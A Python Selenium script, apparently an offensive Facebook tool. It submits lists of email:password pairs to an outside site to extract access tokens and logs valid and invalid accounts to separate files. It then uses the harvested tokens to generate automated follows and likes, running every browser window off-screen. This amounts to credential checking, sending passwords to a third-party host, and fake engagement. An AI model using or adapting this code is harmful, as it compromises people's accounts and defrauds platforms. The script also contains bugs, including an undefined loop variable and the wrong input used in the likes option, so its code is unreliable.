try:
    from selenium import webdriver
    from time import sleep
    from colored import fg, attr
except:
    print('[-] Please Install Selenium And Colored')

print(fg('#f1c40f')+'''
███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
█████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝ 
██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗ 
██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                  
    
    [1] Extract Access Token 
    [2] Auto Followers
    [3] Auto Likes

''')
# Select Services
select_service = input('[+] Enter Service ID : ')

# Run Service
if select_service == "1":
    exreact_upload = input('[+] Enter Email List Path : ')
    extract_emails = open(exreact_upload, 'r')
    
    # Read Accounts
    for email in emails:
        sp = email.split(":")
        username = sp[0]
        password = sp[1]
        driver = webdriver.Chrome()
        driver.set_window_position(-10000,0)
        driver.get('https://web.ftcontrolsv3.com/free_form_fb_get_access_token.php')
        driver.find_element_by_id('email').send_keys(username)
        driver.find_element_by_id('pass').send_keys(password)
        driver.find_element_by_id('start').click()
        data = driver.find_element_by_id('data')
        access = data.text
        if 'Invalid username or password (401)' in access:
            with open('die_access.txt', 'a+') as die:
                die.write(f'[DIE] => {username} : {password} \n')
                driver.quit()
        
        else:
            with open('live_access.txt', 'a+') as live:
                live.write(access + '\n')
                driver.quit()

elif select_service == "2":
    follow_upload = input('[+] Enter Access Tokens List Path : ')
    follow_profil = input('[+] Enter Profile ID : ')
    follow_access = open(follow_upload, 'r')
    for access in follow_access:
        driver = webdriver.Chrome()
        driver.set_window_position(-10000,0)
        driver.get('https://web.ftcontrolsv3.com/free_form_fb_send_auto_follow_access_token.php')
        driver.find_element_by_id('data').send_keys(access)
        driver.find_element_by_id('urlpost').send_keys(follow_profil)
        driver.find_element_by_id('checktoken').click()
        sleep(10)
        driver.quit()

elif select_service == "3":
    likes_upload = input('[+] Enter Access Tokens List Path : ')
    likes_postid = input('[+] Enter Post URL : ')
    likes_access = open(likes_upload, 'r')
    for access in likes_access:
        driver = webdriver.Chrome()
        driver.set_window_position(-10000,0)
        driver.get('https://web.ftcontrolsv3.com/free_form_fb_send_like_access_token.php')
        driver.find_element_by_id('data').send_keys(access)
        driver.find_element_by_id('urlpost').send_keys(follow_profil)
        driver.find_element_by_id('checktoken').click()
        sleep(10)
        driver.quit()
